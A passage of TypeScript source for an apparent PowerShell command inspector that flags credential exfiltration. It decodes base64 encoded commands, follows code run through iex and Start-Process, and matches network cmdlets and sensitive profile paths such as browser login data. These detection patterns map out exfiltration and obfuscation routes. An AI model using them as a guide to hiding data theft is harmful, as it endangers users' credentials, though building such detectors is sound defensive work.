        for (const body of bodies) {
          const nested = walk(body, stageCtx, networkText);
          if (nested) return nested;
        }
      }
      if (commandCarriesData(stage, stageCtx)) fedByData = true;
    }
  }
  return null;
}

function hasDotnetSend(cmd: PsCommand): boolean {
  return cmd.tokens.some((token) => token.kind === "word" && DOTNET_SEND.test(token.text));
}

function isNetworkCommand(name: string, args: readonly PsToken[]): boolean {
  const bare = name.replace(/\.exe$/, "");
  return HTTP_CMDLETS.has(name) || OTHER_NETWORK_CMDLETS.has(name) || OTHER_NETWORK_CMDLETS.has(bare)
    || isNetworkProgram([bare])
    || (COPY_CMDLETS.has(name) && (parameterIndex(args, "tosession") !== -1 || args.some((token) => token.kind === "word" && /^@\w+$/.test(token.text))));
}

/** A network-capable command anywhere (any position, any depth). */
function hasNetwork(pipelines: readonly PsPipeline[], ctx: Context): boolean {
  return allPipelines(pipelines).some((pipeline) => pipeline.stages.some((stage) => {
    const { name, args } = headOf(stage, ctx);
    return name !== undefined && isNetworkCommand(name, args);
  }));
}

/** `$p = @{ Key = value; … }` anywhere in the command, for `@p` splats. */
function collectSplats(pipelines: readonly PsPipeline[], ctx: Context): void {
  const invalid = new Set<string>();
  const assigned = new Set<string>();
  for (const pipeline of allPipelines(pipelines)) {
    const only = pipeline.stages.length === 1 && pipeline.stages[0]!.tokens.length === 1 ? pipeline.stages[0]!.tokens[0]! : undefined;
    for (const name of pipeline.assign) {
      if (assigned.has(name) || pipeline.compound || only?.kind !== "group" || only.open !== "@{" || only.body.some((entry) => entry.key === undefined)) {
        invalid.add(name);
      } else {
        const entries: PsToken[] = only.body.flatMap((entry): PsToken[] => [
          word(`-${entry.key!}`, `-${entry.key!}`, false, []),
          { kind: "group", raw: "(…)", open: "(", body: [{ ...entry, assign: [] }] },
        ]);
        ctx.splats.set(name, entries);
      }
      assigned.add(name);
    }
  }
  for (const pipeline of allPipelines(pipelines)) {
    const targets = new Set(pipeline.assign);
    for (const match of pipeline.references.matchAll(/\$(?:\{([^}]+)\}|([\w:]+))/g)) {
      const name = (match[1] ?? match[2]!).toLowerCase();
      if (targets.delete(name)) continue;
      // Member/index updates, mutator calls, aliases and opaque object uses all
      // invalidate the literal snapshot. A later literal cannot restore it.
      if (ctx.splats.has(name)) invalid.add(name);
    }
  }
  for (const name of invalid) ctx.splats.delete(name);
}

/** Cmdlet writes and same-process script evaluation invalidate literal snapshots. */
function invalidateVariableMutations(pipelines: readonly PsPipeline[], ctx: Context): void {
  for (const pipeline of allPipelines(pipelines)) for (const stage of pipeline.stages) {
    const { name, args } = headOf(stage);
    const script = name === "iex" || name === "invoke-expression" || stage.tokens.some((token) => token.kind === "word"
      && !token.quoted && /(?:\.invoke|\[scriptblock\]::create)$/i.test(token.text));
    let target: string | undefined;
    if (name !== undefined && (SET_VARIABLE.has(name) || /^(?:clear-variable|clv|remove-variable|rv)$/.test(name))) {
      target = parameterValue(args, "name") ?? (args[0]?.kind === "word" ? args[0].text : "*");
    } else if (name !== undefined && /^(?:set|new|clear|remove|copy|move)-(?:item|content)$/.test(name)) {
      target = args.map((token) => token.kind === "word" ? /^variable:(.*)$/i.exec(token.text)?.[1] : undefined).find((value) => value !== undefined);
    }
    if (!script && target === undefined) continue;
    for (const key of new Set([...ctx.splats.keys(), ...ctx.values.keys()])) {
      if (!script && target !== undefined && /^[\w:]+$/.test(target) && key !== target.toLowerCase()) continue;
      ctx.splats.delete(key);
      ctx.values.set(key, { text: DYNAMIC, computed: true });
    }
  }
}

// ─── Embedded code ───────────────────────────────────────────────────────

function isPowerShell(name: string): boolean {
  return /^(?:pwsh|powershell)(?:\.exe)?$/i.test(canonicalName(name));
}

/** Literal script text, or null when runtime evaluation supplies any part. */
function literalCode(tokens: readonly PsToken[], ctx: Context): string | null {
  if (tokens.length === 0) return null;
  const hasExpansion = (token: PsToken): boolean => token.kind === "word"
    ? !token.raw.startsWith("'") && !token.raw.startsWith("@'") && /\$(?:\{|[\w:(])/.test(token.raw.replace(/`./gs, ""))
    : token.open !== "{" && token.body.some((pipeline) => pipeline.stages.some((stage) => stage.tokens.some(hasExpansion)));
  if (tokens.some(hasExpansion)) return null;
  const value = evaluateValue(tokens, ctx);
  if (value?.computed) return value.text.includes(DYNAMIC) ? null : value.text;
  const texts = tokens.map((token) => token.kind === "group" && token.open === "{"
    ? token.raw.slice(1, -1) : evaluateValue([token], ctx)?.text);
  return texts.every((text) => text !== undefined && !text.includes(DYNAMIC)) ? texts.join(" ") : null;
}

function decodeCommand(text: string | null): string | null {
  if (text === null) return null;
  const encoded = text.replace(/\s/g, "");
  if (!encoded || encoded.length % 4 !== 0 || !/^[A-Za-z0-9+/]+={0,2}$/.test(encoded)) return null;
  const bytes = Buffer.from(encoded, "base64");
  if (bytes.length % 2 !== 0 || bytes.toString("base64") !== encoded) return null;
  try {
    return new TextDecoder("utf-16le", { fatal: true }).decode(bytes);
  } catch {
    return null;
  }
}

function shellCode(args: readonly PsToken[], ctx: Context, joinedArguments = false): string | null {
  const encoded = args.findIndex((token) => parameterIs(token, "encodedcommand") || (token.kind === "word" && !token.quoted && normalizeDashes(token.text).toLowerCase() === "-ec"));
  const command = parameterIndex(args, "command");
  const index = encoded === -1 ? command : encoded;
  if (index === -1) return null;
  const flag = args[index] as PsWord;
  const colon = flag.text.indexOf(":");
  const values = colon === -1 ? args.slice(index + 1) : [word(flag.text.slice(colon + 1), flag.text.slice(colon + 1), false, []), ...args.slice(index + 1)];
  if (encoded !== -1) return decodeCommand(literalCode(values.slice(0, 1), ctx));
  return joinedArguments && values.length > 1 ? values.map((token) => token.raw).join(" ") : literalCode(values, ctx);
}

/** undefined means this command does not execute an embedded script. */
function embeddedCode(cmd: PsCommand, feeder: PsCommand | undefined, ctx: Context): string | null | undefined {
  const call = cmd.tokens[0];
  const target = cmd.tokens[1];
  if (call?.kind === "word" && (call.text === "&" || call.text === ".")
    && !(target?.kind === "group" && target.open === "{") && (target === undefined || literalCode([target], ctx) === null)) return null;
  const { name, args } = headOf(cmd, ctx);
  if (name !== undefined && isPowerShell(name)) return shellCode(args, ctx);
  if (name === "iex" || name === "invoke-expression") {
    const index = parameterIndex(args, "command");
    if (args.length) return literalCode(index === -1 ? args : args.slice(index + 1), ctx);
    if (!feeder) return null;
    const head = headOf(feeder);
    return literalCode(head.name === "write-output" || head.name === "echo" ? head.args : feeder.tokens, ctx);
  }
  if (name === "start-process" || name === "saps" || name === "start") {
    const expanded = expandSplats(args, ctx);
    if (expanded === null) return null;
    const fileIndex = parameterIndex(expanded, "filepath");
    const target = fileIndex === -1 ? expanded[0] : expanded[fileIndex + 1];
    const path = target ? literalCode([target], ctx) : null;
    if (path === null) return null;
    if (!isPowerShell(path)) return undefined;
    const list = parameterIndex(expanded, "argumentlist");
    let childArgs = list === -1 ? expanded.slice(fileIndex === -1 ? 1 : fileIndex + 2) : expanded.slice(list + 1);
    if (childArgs.length === 1 && childArgs[0]?.kind === "group" && childArgs[0].open === "@(") {
      const body = childArgs[0].body;
      if (body.length !== 1 || body[0]!.stages.length !== 1) return null;
      childArgs = body[0]!.stages[0]!.tokens;
    }
    // The launcher joins its argument list before the child parses it.
    const text = literalCode(childArgs, ctx);
    const child = text === null ? null : lex(`${path} ${text}`);
    const command = child?.length === 1 && child[0]!.stages.length === 1 ? child[0]!.stages[0] : undefined;
    return command ? shellCode(headOf(command).args, ctx, true) : null;
  }
  for (let index = 0; index < cmd.tokens.length; index += 1) {
    const token = cmd.tokens[index]!;
    if (token.kind === "word" && !token.quoted && /\[(?:system\.management\.automation\.)?scriptblock\]::create$/i.test(token.text)) {
      const body = cmd.tokens[index + 1];
      return body?.kind === "group" && body.body.length === 1 && body.body[0]!.stages.length === 1
        ? literalCode(body.body[0]!.stages[0]!.tokens, ctx) : null;
    }
  }
  if (cmd.tokens.some((token) => token.kind === "word" && !token.quoted && /\.invoke$/i.test(token.text))) return null;
  return undefined;
}

// ─── Path normalization ──────────────────────────────────────────────────

const DYNAMIC = "__ave_dynamic__";

function envValue(name: string): string {
  switch (name.toLowerCase()) {
    case "home": case "userprofile": case "homepath": return homedir();
    case "homedrive": return "";
    case "appdata": return join(homedir(), "AppData", "Roaming");
    case "localappdata": return join(homedir(), "AppData", "Local");
    default: return DYNAMIC;
  }
}

/**
 * PowerShell path spellings in bash-scan form: backtick escapes dropped,
 * `$env:USERPROFILE` / `${env:HOME}` / `$HOME` / `[Environment]::GetFolderPath('UserProfile')`
 * expanded, provider prefixes removed and `\` turned into `/`.
 */
function normalizePaths(text: string): string {
  return text
    .replace(/`(.)/gs, "$1")
    .replace(/\$\{env:([\w()]+)\}|\$env:(\w+)/gi, (_match, braced: string | undefined, plain: string | undefined) => envValue(braced ?? plain!))
    .replace(/\$\{home\}|\$home\b/gi, homedir())
    .replace(/\[(?:system\.)?environment\]::getfolderpath\(\s*['"]?(?:\[[^\]]*\]::)?userprofile['"]?\s*\)/gi, homedir())
    .replace(/(?:microsoft\.powershell\.core\\)?filesystem::/gi, "")
    .replace(/\\/g, "/");
}

/** Components beneath an explicit or working-directory-relative profile anchor. */
function homeSegments(text: string, cwd: string | undefined): string[] | undefined {
  const normalized = posix.normalize(normalizePaths(text));
  if (normalized === "~") return [];
  if (normalized.startsWith("~/")) return normalized.slice(2).split("/");
  const home = normalizePaths(homedir()).replace(/\/$/, "");
  if (normalized.toLowerCase() === home.toLowerCase()) return [];
  if (normalized.toLowerCase().startsWith(`${home.toLowerCase()}/`)) return normalized.slice(home.length + 1).split("/");
  const profile = /^[a-z]:\/users\/[^/]+(?:\/|$)/i.exec(normalized);
  if (profile) return normalized.slice(profile[0].length).split("/").filter(Boolean);
  if (cwd && !/^(?:\/|[a-z]:|~)/i.test(normalized)) return homeSegments(`${normalizePaths(cwd)}/${normalized}`, undefined);
  return undefined;
}

/** Short components and opaque suffixes are compared against the canonical table. */
function sensitiveValue(value: PsValue, cwd: string | undefined): string | null {
  const normalized = normalizePaths(value.text);
  const direct = sensitivePathInArgumentText(normalized, cwd);
  if (direct) return direct;
  const opaque = value.computed && normalized.includes(DYNAMIC);
  if (!opaque && !/~\d/.test(normalized)) return null;
  const prefix = opaque ? normalized.slice(0, normalized.indexOf(DYNAMIC)) : normalized;
  const segments = homeSegments(prefix.replace(/\/$/, ""), cwd);
  if (!segments) return null;
  for (const row of SENSITIVE_PATH_ENTRIES) {
    if (row.anchor !== "home" || (!opaque && segments.length < row.segments.length)) continue;
    if (segments.slice(0, row.segments.length).every((segment, index) => {
      const expected = row.segments[index]!.toLowerCase();
      const short = /^(.*?)~\d/i.exec(segment);
      return short ? expected.startsWith(short[1]!.toLowerCase())
        : opaque && index === segments.length - 1 ? expected.startsWith(segment.toLowerCase()) : expected === segment.toLowerCase();
    })) return `**/${row.segments.join("/")}${row.kind === "dir" ? "/**" : ""}`;
  }
  return null;
}

function sensitiveValues(pipelines: readonly PsPipeline[], ctx: Context): string | null {
  for (const pipeline of allPipelines(pipelines)) for (const stage of pipeline.stages) {
    const values = [evaluateValue(stage.tokens, ctx), ...stage.tokens.map((token) => evaluateValue([token], ctx))];
    for (const value of values) {
      const hit = value && sensitiveValue(value, ctx.cwd);
      if (hit) return `sensitive path argument (${hit})`;
    }
  }
  return null;
}

// ─── Signals ─────────────────────────────────────────────────────────────

function lex(command: string): PsPipeline[] | null {
  try {
    return new Lexer(command).parseProgram();
  } catch (error) {
    if (error instanceof PsUnreadable) return null;
    throw error;
  }
}

/**
 * The sensitive-path floor for a PowerShell command, or `null`. Pass a
 * {@link ParsedShellCommand} to share the bash reading's parse with the
 * exfiltration floor (one parse per decision).
 */
function visibleSensitivePath(parsed: ParsedShellCommand, cwd: string | undefined): string | null {
  const bash = shellSensitivePathSignal(parsed, cwd);
  if (bash) return bash;
  const text = normalizePaths(parsed.command);
  let hit = sensitivePathInCodeText(text, cwd);
  // Quoted paths may hold spaces (`"…\User Data\Default\Login Data"`).
  for (const quoted of text.matchAll(/"([^"]*)"|'([^']*)'/g)) {
    if (hit) break;
    hit = sensitivePathInArgumentText(quoted[1] ?? quoted[2]!, cwd);
  }
  return hit ? `sensitive path argument (${hit})` : null;
}

export function powerShellSensitivePathSignal(input: ShellCommandInput, cwd?: string): string | null {
  return inspectPowerShell(asParsedShellCommand(input), cwd, 0).sensitive;
}

/** The credential-exfiltration floor for a PowerShell command, or `null`. */
export function powerShellExfiltrationSignal(input: ShellCommandInput, cwd?: string): string | null {
  return inspectPowerShell(asParsedShellCommand(input), cwd, 0).exfiltration;
}

interface FloorSignals {
  sensitive: string | null;
  exfiltration: string | null;
}

function inspectPowerShell(parsed: ParsedShellCommand, cwd: string | undefined, depth: number): FloorSignals {
  const { command } = parsed;
  let sensitive = visibleSensitivePath(parsed, cwd);
  if (depth >= MAX_DEPTH) return { sensitive, exfiltration: "PowerShell hidden code (inspection depth exceeded)" };
  const pipelines = lex(command);
  const networkText = DOTNET_NETWORK.test(command);
  if (pipelines === null) {
    return { sensitive, exfiltration: UNREADABLE_FALLBACK.test(normalizeDashes(command))
      ? "PowerShell file upload (unparsed)" : "PowerShell hidden code (unparsed)" };
  }
  const ctx: Context = { cwd, tainted: new Set(), splats: new Map(), values: new Map() };
  collectSplats(pipelines, ctx);
  collectValues(pipelines, ctx);
  invalidateVariableMutations(pipelines, ctx);
  collectTainted(pipelines, ctx);
  sensitive ??= sensitiveValues(pipelines, ctx);
  let exfiltration = walk(pipelines, ctx, networkText);
  for (const pipeline of allPipelines(pipelines)) for (let index = 0; index < pipeline.stages.length; index += 1) {
    const code = embeddedCode(pipeline.stages[index]!, pipeline.stages[index - 1], ctx);
    if (code === undefined) continue;
    if (code === null) {
      exfiltration ??= sensitive ? `${sensitive.replace(/^sensitive path argument/, "sensitive path")} with hidden code` : "PowerShell hidden code (runtime script)";
      continue;
    }
    const nested = inspectPowerShell(asParsedShellCommand(code), cwd, depth + 1);
    sensitive ??= nested.sensitive;
    exfiltration ??= nested.exfiltration;
  }
  if (sensitive && !exfiltration) {
    const detail = sensitive.replace(/^sensitive path argument/, "sensitive path");
    if (networkText || hasNetwork(pipelines, ctx)) exfiltration = `${detail} with a network transport`;
    else if (HIDDEN_CODE.test(normalizeDashes(command))) exfiltration = `${detail} with hidden code`;
  }
  return { sensitive, exfiltration: exfiltration ?? shellExfiltrationSignal(parsed, cwd) };
}
